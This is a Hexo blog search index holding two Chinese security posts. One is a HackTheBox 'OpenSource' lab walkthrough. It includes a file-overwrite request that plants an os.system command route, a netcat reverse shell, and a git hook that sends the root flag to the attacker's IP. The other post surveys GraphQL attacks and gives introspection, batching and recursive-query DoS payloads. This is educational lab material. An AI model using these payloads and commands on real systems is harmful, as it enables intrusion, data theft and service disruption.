<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox-OpenSource</title>
      <link href="/2022/07/25/hackthebox-opensource/"/>
      <url>/2022/07/25/hackthebox-opensource/</url>
      
        <content type="html"><![CDATA[<h1 id="HackTheBox-OpenSource"><a href="#HackTheBox-OpenSource" class="headerlink" title="HackTheBox-OpenSource"></a>HackTheBox-OpenSource</h1><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>通过路径遍历获取Python源码的压缩包，解压发现存在问题的代码如下:</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_CCx0QCxm2S.png"></p><p>问题函数是一个文件上传函数，主要问题点在文件保存路径拼接处。<code>file_name</code>经过字符串处理，<code>../</code>等恶意字符串已过滤，问题出在Python的<code>os.path.join()</code>函数。</p><p>官方介绍如下，其中当一个拼接的路径是一个绝对路径时，该函数将抛弃之前的所有参数，返回值就由是绝对路径的参数控制</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_409eo8HPXc.png"></p><p>那么将上传文件的文件名参数设置成绝对路径，以此任意覆盖站点Python源码。只要控制文件名参数在过滤<code>../</code>后为绝对路径即可（或者直接为绝对路径），这里选择添加一个命令执行的路由覆盖原Python文件，数据包如下：</p><pre class="line-numbers language-纯文本" data-language="纯文本"><code class="language-纯文本">POST /upcloud HTTP/1.1Host: 10.10.11.164User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------10852647030022141372406507594Content-Length: 1089Origin: http://10.10.11.164Connection: closeReferer: http://10.10.11.164//upcloudUpgrade-Insecure-Requests: 1-----------------------------10852647030022141372406507594Content-Disposition: form-data; name="file"; filename="..//app/app/views.py"Content-Type: image/jpegimport osfrom app.utils import get_file_namefrom flask import render_template, request, send_filefrom app import app@app.route('/', methods=['GET', 'POST'])def upload_file():    if request.method == 'POST':        f = request.files['file']        file_name = get_file_name(f.filename)        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)        f.save(file_path)        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)    return render_template('upload.html')@app.route('/uploads/&lt;path:path&gt;')def send_report(path):    path = get_file_name(path)    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))@app.route('/exec')def runcmd():    return render_template('success.html',file_url=os.system(request.args.get('cmd')))-----------------------------10852647030022141372406507594--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_HvXgh3gi4-.png"></p><p>执行命令正常则返回0</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_pDOhe25SOU.png"></p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>可执行命令之后，尝试反弹shell，使用nc反弹。</p><p>这里直接用<code>sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>反弹一直失败，具体原因不知，使用如下命令可正常返回</p><pre class="line-numbers language-纯文本" data-language="纯文本"><code class="language-纯文本">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.91%2018080%20%3E%2Ftmp%2Ffrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.91 18080 &gt;/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_pMR4YqgdSO.png"></p><p>成功反弹之后使用命令检查是否为docker容器，这里确认是docker</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image__7mE-C2IQi.png"></p><p>查看网络情况，常识可知在linux下安装docker后会新建一个<code>docker0</code>的网卡一般子网掩码为<code>172.17.0.1/16</code>，宿主机一般可通过<code>172.17.0.1</code>访问</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_7YExtIgHWY.png"></p><p>这里使用<a href="https://github.com/jpillora/chisel" title="chisel">chisel</a>做一下socks代理，使用反向连接，攻击机本地监听一个端口</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_jxyB9R6hog.png"></p><p>在攻击机使用python搭建简易http server，方便将chisel传输到受害主机。赋予足够的权限之后，反向连接攻击主机</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_4X1WlkF7Yn.png"></p><p>在成功代理后，对宿主机<code>172.17.0.1</code>进行简单的端口探测，发现开放web 3000端口，尝试访问发现是搭建好的Gitea代码托管平台</p><p>到这里缺少继续的信息，继续在受害主机挖掘信息，还记得原先下载下来的源码仓库么，通过查看commit历史记录或许能挖掘到一些信息</p><p>通过查看分支发现存在dev分支，继续查看该分支的commit记录，翻找之后发现某条记录中存在登录认证信息：<code>dev01:Soulless_Developer#2022</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> show-branch  <span class="token function">git</span> log dev --oneline   <span class="token function">git</span> show a76f8f7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_Wiq2tsZUdX.png"></p><p>使用该账户密码成功登录宿主机的Gitea，在相应的仓库中发现ssh登录的私钥</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_gfH3xHnyha.png"></p><p>下载到本地之后，赋予相应的权限，ssh成功登录宿主机，成功获得普通用户的flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">600</span> id_rsa <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_tUO5nvVwNY.png"></p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>获取用户权限之后尝试提权，首先查找高权限文件未果，这里使用pspy查看定时任务信息</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_D16-QjIx5b.png"></p><p>发现root权限的git相关任务，其中git commit可触发hook脚本。可以修改<code>pre-commit</code>脚本，在其中添加我们需要执行的命令，在下次commit的时候触发执行</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_13MOn3y4pm.png"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_RW3ur6ACfu.png"></p><p>还是使用nc获取执行结果，攻击端执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lp <span class="token number">18083</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将以下代码添加到 <code>~/.git/hooks/pre-commit.sample</code>文件中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/root.txt <span class="token operator">|</span><span class="token function">nc</span> -nv <span class="token number">10.10</span>.14.91 <span class="token number">18083</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改文件名使hook脚本生效</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> pre-commit.sample pre-commit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_cngf7pgI--.png"></p><p>成功获取root flag</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.5/pic-20220725/image_p2ZWA5W3L4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GraphQL攻击面总结</title>
      <link href="/2022/07/13/graphql-gong-ji-mian-zong-jie/"/>
      <url>/2022/07/13/graphql-gong-ji-mian-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="GraphQL攻击面总结"><a href="#GraphQL攻击面总结" class="headerlink" title="GraphQL攻击面总结"></a>GraphQL攻击面总结</h1><h1 id="GraphQL介绍"><a href="#GraphQL介绍" class="headerlink" title="GraphQL介绍"></a>GraphQL介绍</h1><p>GraphQL 是一个开源的数据查询语言(DQL)和数据处理语言(DML).最初，GraphQL由Facebook于2012年左右开发并于2015年公开发布。其主要优点之一是为其他Web服务体系结构（如REST）提供了一种更高效，更强大的替代方案。</p><h1 id="结构特性"><a href="#结构特性" class="headerlink" title="结构特性"></a>结构特性</h1><p>GraphQL并没有绑定数据库，交互逻辑是客户端→GraphQL→后端代码→数据，不同于REST API的交互逻辑：客户端→后端代码→数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_TbMXI62Ej9.png"></p><p>传统REST API实现功能一般是一个api对应一个功能，比如请求<a href="http://www.test.com/users" title="http://www.test.com/userinfo">http://www.test.com/userinfo</a>，后端返回用户信息；当客户端请求主页菜单，实现这个api就需要后端实现另外一个url对应到指定代码。</p><p>而在GraphQL中，用户请求的url路径固定，只需要改变请求的post内容，无需维护多个api</p><p>比如查询ID为1的人的生日，post内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_270eFfbe3a.png"></p><p>当想查询ID为1的人的身高和发色时请求如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_5L8CdZR1vY.png"></p><p>两个请求的url路由都为同一个且固定。</p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="类型语言"><a href="#类型语言" class="headerlink" title="类型语言"></a>类型语言</h2><p>在GraphQL查询过程中，基本上是对对象或者对象的某些字段进行查询。客户端在查询之前可以通过schema了解到对象的基本属性字段，当查询请求到后端时，服务器会根据schema验证并执行查询。</p><p>GraphQL 服务可以用任何语言编写，它有一套自己的简单语言，称之为 “GraphQL schema language” —— 它和 GraphQL 的查询语言很相似，让我们能够和 GraphQL schema 之间可以无语言差异地沟通。</p><h2 id="基本数据结构"><a href="#基本数据结构" class="headerlink" title="基本数据结构"></a>基本数据结构</h2><p>一个 GraphQL schema 中的最基本的组件是对象类型，它就表示你可以从服务上获取到什么类型的对象，以及这个对象有什么字段。使用 GraphQL schema language，我们可以这样表示它：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">type Character <span class="token punctuation">{</span>  name<span class="token operator">:</span> String<span class="token operator">!</span>  appearsIn<span class="token operator">:</span> <span class="token punctuation">[</span>Episode<span class="token operator">!</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>  <code>Character</code> 是一个 <strong>GraphQL 对象类型</strong>，表示其是一个拥有一些字段的类型。你的 schema 中的大多数类型都会是对象类型。</p></li><li><p>  <code>name</code> 和 <code>appearsIn</code> 是 <code>Character</code> 类型上的<strong>字段</strong>，这也是可查询到的内容。</p></li><li><p>  <code>String</code> 是内置的<strong>标量</strong>类型之一</p></li><li><p>  <code>String!</code> 表示这个字段是<strong>非空的</strong>，GraphQL 服务保证当你查询这个字段后总会给你返回一个值。在类型语言里面，我们用一个感叹号来表示这个特性。</p></li><li><p>  <code>[Episode!]!</code> 表示一个 <code>Episode</code> <strong>数组</strong>。因为它也是<strong>非空的</strong>，所以当你查询 <code>appearsIn</code> 字段的时候，你也总能得到一个数组（零个或者多个元素）。且由于 <code>Episode!</code> 也是<strong>非空的</strong>，你总是可以预期到数组中的每个项目都是一个 <code>Episode</code> 对象。</p></li></ul><p>学过面向对象编程的应该会感到熟悉，与定义一个对象的过程很相似</p><h2 id="GraphQL端点"><a href="#GraphQL端点" class="headerlink" title="GraphQL端点"></a>GraphQL端点</h2><p>记录特征能够有效判断资产使用组件情况，能够帮助我们快速发现攻击方向和脆弱目标。常见的GraphQL端点路径如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/graphql/graphql/console/graphql.php/graphiql/graphiql.php/api/graphql/***ql......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上路径只是协助发现并确认是否使用GraphQL，如果资产使用GraphQL，也可以通过数据包特征确认：</p><ul><li><p>  POST或GET包重复请求同一个url，请求传参不同，返回数据也不同</p></li><li><p>  传参为JSON格式，字段多出现query、variables、operationName，返回包的JSON多为<code>{"data":{...}}</code>，如下：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_dwVKJrhtS8.png"></p><ul><li>  报错信息：<code>"Syntax Error: Expected Name, found</code></li></ul><h2 id="基本操作类型"><a href="#基本操作类型" class="headerlink" title="基本操作类型"></a>基本操作类型</h2><p>GraphQL官方提供三种操作类型：query（查询）、mutation（变更）、subscription（订阅），最常用的是query，这里就简单介绍下Query方法的使用。</p><h3 id="Query方法"><a href="#Query方法" class="headerlink" title="Query方法"></a>Query方法</h3><p>假设定义一个查询类型：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">type Query <span class="token punctuation">{</span>  <span class="token function">hero</span><span class="token punctuation">(</span>episode<span class="token operator">:</span> Episode<span class="token punctuation">)</span><span class="token operator">:</span> Character  <span class="token function">droid</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token constant">ID</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">:</span> Droid<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在这个查询中可以确定有两个字段hero和droid，那么就可做如下请求去使用定义的查询服务，其中在查询droid的时候传入阐述id，意为查询 id为2000的droid对象的name字段信息：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">query <span class="token punctuation">{</span>  hero<span class="token punctuation">{</span>    name  <span class="token punctuation">}</span>  <span class="token function">droid</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token string">"2000"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    name  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>在GraphQL中，每一个字段和嵌套对象都能有自己的一组参数，从而使得GraphQL可以完美替代多次API获取请求。基本的使用如上面的例子，通过指定对象中某一个字段的值进行参数传递，完成查询。</p><p>其中需要注意的是，一个变更也能包含多个字段，一如查询。查询和变更之间名称之外的一个重要区别是：<strong>查询字段时，是并行执行，而变更字段时，是线性执行，一个接着一个。</strong>这也保证了变更字段值的时候不会出现资源竞态问题。</p><h2 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h2><p>在交互中，在使用GraphQL之前我们是不知道shema支持的查询类型和所有对象字段信息的，我们可以通过GraphQL的内省系统获取以上全部的信息。</p><h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="1、内省查询暴露接口信息"><a href="#1、内省查询暴露接口信息" class="headerlink" title="1、内省查询暴露接口信息"></a>1、内省查询暴露接口信息</h2><p>GraphQL内省是一个特殊查询，使用该__schema字段为其架构查询GraphQL。内省查询的作用是提供详细接口信息，简单的来说就是可以通过内省查询来获取GraphQL的接口文档，如对象定义、接口参数等信息。</p><p>内省本身不是弱点，而是功能。但是如果将其提供，则攻击者可能会使用它并滥用它，以寻求有关GraphQL实现的信息，例如存在哪些查询或变异。</p><p>使用以下请求内容可获取全部接口信息：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"\n    query IntrospectionQuery {\n      __schema {\n        \n        queryType { name }\n        mutationType { name }\n        subscriptionType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          \n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n\n    fragment FullType on __Type {\n      kind\n      name\n      description\n      \n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n\n    fragment InputValue on __InputValue {\n      name\n      description\n      type { ...TypeRef }\n      defaultValue\n      \n      \n    }\n\n    fragment TypeRef on __Type {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                  ofType {\n                    kind\n                    name\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  "</span><span class="token punctuation">,</span><span class="token property">"variables"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"operationName"</span><span class="token operator">:</span><span class="token string">"IntrospectionQuery"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_kOfrAfM86X.png"></p><p>常用工具推荐：</p><ul><li>  浏览器插件：Altair GraphQL Client，填入合法GraphQL端点之后就可获取并查看接口文档，点击某条接口可在窗口中直接发起请求</li></ul><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_ifsW3yqdDC.png"></p><ul><li><p>  <a href="https://github.com/2fd/graphdoc" title="https://github.com/2fd/graphdoc">https://github.com/2fd/graphdoc</a> 需要npm环境的工具，可生成本地的html文档</p></li><li><p>  <a href="https://ivangoncharov.github.io/graphql-voyager/" title="https://ivangoncharov.github.io/graphql-voyager/">https://ivangoncharov.github.io/graphql-voyager/</a> 在线的web端的分析平台，可直观展示接口与对象、参数的调用关系。将内省查询的json数据粘贴在内省框中，网页就会展示接口调用全貌</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_29YUmGWvoK.png"></p><p>接口信息比较详细，这也导致了后续同样基于内省查询的其他攻击的派生</p><h3 id="防御方式：生产环境下关闭introspection即内省查询"><a href="#防御方式：生产环境下关闭introspection即内省查询" class="headerlink" title="防御方式：生产环境下关闭introspection即内省查询"></a>防御方式：生产环境下关闭introspection即内省查询</h3><h2 id="2、GraphQL-playground外网未授权访问"><a href="#2、GraphQL-playground外网未授权访问" class="headerlink" title="2、GraphQL playground外网未授权访问"></a>2、GraphQL playground外网未授权访问</h2><p><a href="https://github.com/graphql/graphql-playground" title="Playground">Playground</a>是GraphQL一款开源的IDE，攻击者可在外网暴露的Playground上进行内省查询或者Query等常规操作，作用上类似插件：Altair GraphQL Client，都是为了方便调试GraphQL查询，本身自带内省查询获取接口文档</p><p>常见的路径：<code>graphql_playground</code></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_Ff-EMjIAn_.png"></p><h2 id="3、敏感信息泄露"><a href="#3、敏感信息泄露" class="headerlink" title="3、敏感信息泄露"></a>3、敏感信息泄露</h2><p>这个风险不一定存在，需要通过内省查询或者其他能获取查询接口的方法配合人工挖掘。比如接口文档中的敏感对象或者Query的方法名，例如<code>admin、password、各种key、session、email</code>等</p><p>可通过检索<code>objects.types</code>查询结果入手敏感字段，也可以利用<a href="https://github.com/2fd/graphdoc" title="graphdoc">graphdoc</a>这个工具本地生成对应的接口文档后自行检索</p><p>查询<code>objects.types</code>可使用如下查询：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  __schema <span class="token punctuation">{</span>    types <span class="token punctuation">{</span>      name    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_29SHM4F6zO.png"></p><h2 id="4、Batch批查询导致的DOS"><a href="#4、Batch批查询导致的DOS" class="headerlink" title="4、Batch批查询导致的DOS"></a>4、Batch批查询导致的DOS</h2><p>支持批查询的GraphQL允许客户端同时发送多条独立的查询语句，类型主要有两种：json列表批查询、基于名称的批查询</p><h3 id="Json-list-based-batching"><a href="#Json-list-based-batching" class="headerlink" title="Json list based batching"></a>Json list based batching</h3><p>当我们进行一次query查询，可能如下</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"query { Query { hacktheplanet } }"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以用json列表查询判断当前GraphQL是否支持批处理查询：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>   <span class="token punctuation">{</span>      <span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"query { assetnote: Query { hacktheplanet } }"</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   <span class="token punctuation">{</span>      <span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"query { assetnote: Query { hacktheplanet } }"</span>   <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回了两次查询结果，这就表明当前GraphQL支持批处理查询，那么就可以挑选返回资源较多，或者系统需要响应时间较久的query，同时进行多次查询，占用服务器资源达到DOS的攻击。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>   <span class="token punctuation">{</span>      <span class="token property">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span>         <span class="token punctuation">{</span>            <span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"Cannot query field \"Query\" on type \"Query\"."</span><span class="token punctuation">,</span>            <span class="token property">"locations"</span><span class="token operator">:</span><span class="token punctuation">[</span>               <span class="token punctuation">{</span>                  <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>                  <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">9</span>               <span class="token punctuation">}</span>            <span class="token punctuation">]</span>         <span class="token punctuation">}</span>      <span class="token punctuation">]</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   <span class="token punctuation">{</span>      <span class="token property">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span>         <span class="token punctuation">{</span>            <span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"Cannot query field \"Query\" on type \"Query\"."</span><span class="token punctuation">,</span>            <span class="token property">"locations"</span><span class="token operator">:</span><span class="token punctuation">[</span>               <span class="token punctuation">{</span>                  <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>                  <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">9</span>               <span class="token punctuation">}</span>            <span class="token punctuation">]</span>         <span class="token punctuation">}</span>      <span class="token punctuation">]</span>   <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Query-name-based-batching"><a href="#Query-name-based-batching" class="headerlink" title="Query name based batching"></a>Query name based batching</h3><p>原理类似，只是使用查询的姿势稍有不同，之前使用的是json列表，这里使用一条query进行两次查询</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"query { assetnote: Query { hacktheplanet } assetnote1: Query { hacktheplanet } }"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样返回两次查询结果表明当前是支持批处理查询的</p><p>利用工具<a href="https://github.com/assetnote/batchql" title="https://github.com/assetnote/batchql">https://github.com/assetnote/batchql</a>可检测此类问题</p><h3 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h3><ul><li>  控制查询的资源占用；</li></ul><p>在 GraphQL 中，存在一个称为<strong>查询成本分析</strong>的概念，它将权重值分配给解析成本高于其他字段的字段。使用此功能，我们可以创建一个上限阈值来拒绝昂贵的查询。或者，可以实现缓存功能以避免在短时间内重复相同的请求。</p><ul><li>  非必要无需开启批处理查询</li></ul><h2 id="5、深度递归查询攻击DOS"><a href="#5、深度递归查询攻击DOS" class="headerlink" title="5、深度递归查询攻击DOS"></a>5、深度递归查询攻击DOS</h2><p>根据前文可知GraphQL的最基本的组件是对象类型，一个对象的字段可能是基本的标量例如string，也可能是另外一个对象。</p><p>假使有两个对象相互关联如下，并且定义了一个Query支持这两个对象的查询，容易形成无限嵌套</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">type <span class="token class-name">Thread</span> <span class="token punctuation">{</span>  <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token class-name">Int</span><span class="token punctuation">,</span> after<span class="token operator">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token class-name">Message</span><span class="token punctuation">]</span><span class="token punctuation">}</span>type <span class="token class-name">Message</span> <span class="token punctuation">{</span>  thread<span class="token operator">:</span> <span class="token class-name">Thread</span><span class="token punctuation">}</span>type <span class="token class-name">Query</span> <span class="token punctuation">{</span>  <span class="token function">thread</span><span class="token punctuation">(</span>id<span class="token operator">:</span> ID<span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token class-name">Thread</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当攻击者做如下查询，嵌套多次之后容易造成DOS</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">query maliciousQuery <span class="token punctuation">{</span>  <span class="token function">thread</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token string">"some-id"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      thread <span class="token punctuation">{</span>        <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          thread <span class="token punctuation">{</span>            <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              thread <span class="token punctuation">{</span>                # <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>repeat times <span class="token number">10000.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>              <span class="token punctuation">}</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于这种关联对象的发现，可以使用前文提到的工具<a href="https://ivangoncharov.github.io/graphql-voyager/" title="https://ivangoncharov.github.io/graphql-voyager/">https://ivangoncharov.github.io/graphql-voyager/</a> ，就可以直观的看到对象之间的调用关系，如果两个对象存在循环调用的关系，就存在此漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_cEb2c-wO-o.png"></p><p>另外可使用工具查询获取某参数的查询路径：<a href="https://gitlab.com/dee-see/graphql-path-enum" title="https://gitlab.com/dee-see/graphql-path-enum">https://gitlab.com/dee-see/graphql-path-enum</a></p><h3 id="防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100"><a href="#防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100" class="headerlink" 